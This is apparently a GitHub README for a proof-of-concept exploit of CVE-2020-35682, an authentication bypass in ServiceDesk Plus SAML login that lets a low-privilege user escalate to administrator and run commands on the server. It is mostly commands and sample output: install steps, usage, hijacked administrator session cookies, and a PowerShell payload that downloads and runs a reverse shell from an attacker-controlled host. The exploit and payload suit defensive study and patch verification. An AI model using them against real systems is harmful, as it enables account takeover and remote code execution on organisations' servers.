# CVE-2020-35682

SD-91948: CVE-2020-35682: Authentication Bypass Vulnerability during SAML login in ServiceDesk Plus. (As described by [ManageEngine](https://www.manageengine.com/products/service-desk/on-premises/readme.html)). If the target ServiceDesk Plus (<11134) installation has SAML login enabled and you have credentials to a low privilege user then you can escalate to administrator and gain RCE.

I decided to release this POC since there is neither any public exploit nor much description available for exploiting said bug. The code is quite messy but it works.

## Installation

```bash
git clone https://github.com/its-arun/CVE-2020-35682.git
cd CVE-2020-35682
pip3 install -r requirements.txt
chmod +x exploit.py
```

## Usage

```
┌─[✗]─[felli0t@damnlab]─[~/POCs/CVE-2020-35682]
└──╼ $./exploit.py -h
usage: exploit.py [-h] -u URL -e EMAIL -p PASSWORD -d DOMAIN [-x PAYLOAD] [-a ADMINUSERNAME]

CVE-2020-35682 : Authentication Bypass Vulnerability during SAML login in ServiceDesk Plus

optional arguments:
  -h, --help            show this help message and exit
  -x PAYLOAD, --payload PAYLOAD
                        Payload to execute on target, eg: "powershell iex(iwr http://192.168.2.10:8080/reverseshell.ps1
                        -usebasicparsing)"
  -a ADMINUSERNAME, --adminusername ADMINUSERNAME
                        Admin Username, default: administrator

required named arguments:
  -u URL, --url URL     ServiceDesk Plus installation url, eg. https://tenet.local/sdp
  -e EMAIL, --email EMAIL
                        User E-mail for SAML Login, eg: chris@tenent.local
  -p PASSWORD, --password PASSWORD
                        User Password for SAML Login
  -d DOMAIN, --domain DOMAIN
                        Domain, eg: TENET
```
#### Get Administrator Cookie

```
┌─[felli0t@damnlab]─[~/POCs/CVE-2020-35682]
└──╼ $./exploit.py -u "https://tenet.local/sdp" -e 'chris@tenet.local' -p 'P@ssw0rd' -d "TENET"
[+] Created session as administrator.
[+] Use following cookies to login as administrator
	=[COOKIE NAME]=                =[COOKIE VALUE]=              
	JSESSIONIDSSO                  E1D80C738E12085360A789109D43A233
	PORTALID                       1                             
	SDPSESSIONID                   918B7C63186055F72EAD2DEAC34B4CA9

```

#### Execute command on target

```
┌─[felli0t@damnlab]─[~/POCs/CVE-2020-35682]
└──╼ $./exploit.py -u "https://tenet.local/sdp" -e 'chris@tenet.local' -p 'P@ssw0rd' -d "TENET" -x "powershell iex(iwr http://192.168.2.10:8080/reverseshell.ps1 -usebasicparsing)"
[+] Created session as administrator.
[+] Use following cookies to login as administrator
	=[COOKIE NAME]=                =[COOKIE VALUE]=              
	JSESSIONIDSSO                  2316433DF39DFFE8ACD4E1DDD759D259
	PORTALID                       1                             
	SDPSESSIONID                   666788540DB6329CB7E59E1E96FF30EB
[+] Created custom trigger ADQRYN11WA6KEXIQ
[+] Created Request to trigger custom action ADQRYN11WA6KEXIQ
[+] Executed "powershell iex(iwr http://192.168.2.10:8080/reverseshell.ps1 -usebasicparsing)" on "https://tenet.local/sdp"
[+] Deleted Request ADQRYN11WA6KEXIQ
[+] Deleted Custom Action ADQRYN11WA6KEXIQ

```

#### Using with proxy

Proxies can be defined on line 9 in exploit.py in following format
```python
proxies = {'http': 'socks4://127.0.0.1:9050','https': 'socks4://127.0.0.1:9050'}
```
Or you can set proxy as environment variable if you don't wish to edit source
```bash
export HTTP_PROXY="socks4://127.0.0.1:9050"
export HTTPS_PROXY="socks4://127.0.0.1:9050"
```
Make sure to unset these variables after running exploit.
```bash
unset HTTP_PROXY HTTPS_PROXY
```
